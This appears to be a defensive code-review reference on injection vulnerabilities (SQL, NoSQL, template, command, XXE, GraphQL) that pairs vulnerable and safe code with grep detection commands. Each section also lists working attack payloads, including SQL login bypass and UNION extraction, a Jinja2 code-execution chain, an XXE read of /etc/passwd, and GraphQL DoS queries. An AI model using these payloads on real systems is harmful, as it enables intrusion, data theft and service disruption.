# Injection Vulnerabilities — Reference

## SQL Injection

### Sources (attacker-controlled input)
```
request.args, request.form, request.json, request.data
req.body, req.query, req.params
URL path parameters, HTTP headers (X-Forwarded-For, User-Agent)
```

### Dangerous Sinks
```python
# Python — VULNERABLE
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
cursor.execute("SELECT * FROM users WHERE name = '" + name + "'")
db.execute(text(f"SELECT * FROM {table}"))  # table name injection

# Python — SAFE
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
db.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_id})
```

```typescript
// TypeScript — VULNERABLE
db.query(`SELECT * FROM users WHERE email = '${email}'`)
knex.raw(`SELECT * FROM ${tableName}`)  // table name injection

// TypeScript — SAFE
db.query("SELECT * FROM users WHERE email = $1", [email])
knex('users').where('email', email)
```

### Attack Payloads
```sql
-- Auth bypass
' OR '1'='1
' OR 1=1--
admin'--
' OR 'x'='x

-- Data extraction
' UNION SELECT null, username, password FROM users--
' UNION SELECT null, table_name FROM information_schema.tables--

-- Boolean blind
' AND SUBSTRING(password,1,1)='a'--

-- Time-based blind
'; WAITFOR DELAY '0:0:5'--   (MSSQL)
' AND SLEEP(5)--              (MySQL)
```

### Detection Grep
```bash
grep -rn "cursor\.execute\|\.execute(\"\|f\"SELECT\|f\"INSERT\|f\"UPDATE\|f\"DELETE\|f\"WHERE" \
  --include="*.py" . | grep -v node_modules | grep -v test
grep -rn "db\.query\`\|knex\.raw\|sequelize\.query" \
  --include="*.ts" --include="*.js" . | grep -v node_modules | grep -v test
```

---

## NoSQL Injection (MongoDB)

### Vulnerable Pattern
```javascript
// VULNERABLE — operator injection
User.find({ username: req.body.username })
// Attacker sends: { "username": { "$ne": "" } }  → returns all users

// SAFE
User.find({ username: String(req.body.username) })
```

### Attack Payloads
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$regex": ".*"}}
{"$where": "this.password.length > 0"}
```

---

## Server-Side Template Injection (SSTI)

### Vulnerable Frameworks and Patterns
```python
# Jinja2 — VULNERABLE
from jinja2 import Template
Template(user_input).render()  # user controls template string
render_template_string(f"Hello {user_input}")

# SAFE
render_template("hello.html", name=user_input)  # static template file
```

### Detection
```bash
grep -rn "render_template_string\|Template(\|\.render(" \
  --include="*.py" . | grep -v "static\|fixture"
```

### Attack Payloads
```
# Jinja2 — detect
{{7*7}}          → 49
{{config}}       → exposes app config

# Jinja2 — RCE
{{''.__class__.__mro__[1].__subclasses__()}}
{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

---

## Remote Code Execution (RCE)

### Dangerous Python Sinks
```python
# VULNERABLE
os.system(user_input)
subprocess.call(user_input, shell=True)  # shell=True is the danger
eval(user_input)
exec(user_input)
__import__(user_input)
pickle.loads(user_bytes)   # arbitrary code in pickle data

# SAFE
subprocess.call(["ls", "-la"])   # list of args, no shell=True
subprocess.call(shlex.split(command))  # still risky if command has user input
```

### Dangerous JS/TS Sinks
```javascript
eval(userInput)
new Function(userInput)
vm.runInNewContext(userInput)
child_process.exec(userInput)  // shell=true equivalent
child_process.execSync(`cmd ${userInput}`)  // template literal injection
```

### Detection
```bash
grep -rn "os\.system\|subprocess.*shell=True\|eval(\|exec(\|pickle\.loads" \
  --include="*.py" . | grep -v test | grep -v node_modules
grep -rn "child_process\.exec\b\|\.exec(\`\|new Function(" \
  --include="*.ts" --include="*.js" . | grep -v node_modules | grep -v test
```

---

## XXE (XML External Entity)

### Vulnerable Pattern
```python
# VULNERABLE
import xml.etree.ElementTree as ET
tree = ET.parse(user_uploaded_xml)  # safe by default in Python 3.8+

# VULNERABLE — lxml without defusedxml
from lxml import etree
parser = etree.XMLParser()
etree.parse(file, parser)

# SAFE
import defusedxml.ElementTree as ET
ET.parse(user_xml)
```

### Attack Payload
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Detection
```bash
grep -rn "etree\.parse\|minidom\.parseString\|BeautifulSoup.*xml\|lxml" \
  --include="*.py" . | grep -v defusedxml | grep -v test
```

---

## GraphQL Injection

### Attack Vectors
```graphql
# Introspection — enumerate schema
{ __schema { types { name fields { name } } } }

# Batch query abuse — enumerate users
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  ... (thousands of queries in one HTTP request)
]

# Nested query DoS
{ user { friends { friends { friends { friends { id name } } } } } }
```

### Mitigations to Check
- Introspection disabled in production
- Query depth limiting configured
- Batch query limit configured
- Rate limiting per query cost

---

## CWE References
- CWE-89: SQL Injection
- CWE-943: NoSQL Injection
- CWE-94: Code Injection
- CWE-78: OS Command Injection
- CWE-611: XXE
- CWE-1336: SSTI
